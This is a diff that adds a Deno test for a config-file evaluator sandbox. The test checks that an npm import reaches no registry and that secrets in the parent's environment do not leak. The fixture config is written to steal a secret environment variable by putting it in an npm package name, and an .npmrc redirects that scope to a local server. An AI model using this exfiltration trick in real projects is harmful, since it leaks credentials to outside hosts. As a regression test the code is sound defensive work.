@@ -244,3 +244,34 @@ Deno.test("a config that imports a remote module is refused, not fetched (--no-r
     assertMatch(reasonOf(await evalIn(dir, "next.config.mjs")), /remote|no-remote/i);
   });
 });
+
+Deno.test("an npm import reaches no registry, and the parent's environment stays out", async () => {
+  // npm resolution runs outside the permission sandbox: an .npmrc can aim a scope at any host
+  // and carry data out in the package name. The child makes no request (--cached-only, manual
+  // node_modules) and sees only NODE_ENV, NEXT_PUBLIC_* and Deno's cache location.
+  const hits: string[] = [];
+  const server = Deno.serve({ hostname: "127.0.0.1", port: 0, onListen() {} }, (req) => {
+    hits.push(new URL(req.url).pathname);
+    return new Response("not found", { status: 404 });
+  });
+  Deno.env.set("DENEXT_EVAL_TEST_SECRET", "s3cret");
+  Deno.env.set("NEXT_PUBLIC_EVAL_TEST", "visible");
+  const src = 'const secret = Deno.env.get("DENEXT_EVAL_TEST_SECRET") ?? "unset";\n' +
+    'let imported = "no";\n' +
+    'try { await import("npm:@evil/leak-" + secret); imported = "yes"; } catch { /* refused */ }\n' +
+    'export default { secret, imported, pub: Deno.env.get("NEXT_PUBLIC_EVAL_TEST") ?? "unset" };\n';
+  try {
+    await withConfig("next.config.mjs", src, async (dir) => {
+      const port = (server.addr as Deno.NetAddr).port;
+      await Deno.writeTextFile(join(dir, ".npmrc"), `@evil:registry=http://127.0.0.1:${port}/\n`);
+      await Deno.writeTextFile(join(dir, "deno.json"), '{ "nodeModulesDir": "auto" }\n');
+      const value = valueOf(await evalIn(dir, "next.config.mjs"));
+      assertEquals(value, { secret: "unset", imported: "no", pub: "visible" });
+    });
+    assertEquals(hits, [], "the evaluator child reached the registry");
+  } finally {
+    Deno.env.delete("DENEXT_EVAL_TEST_SECRET");
+    Deno.env.delete("NEXT_PUBLIC_EVAL_TEST");
+    await server.shutdown();
+  }
+});
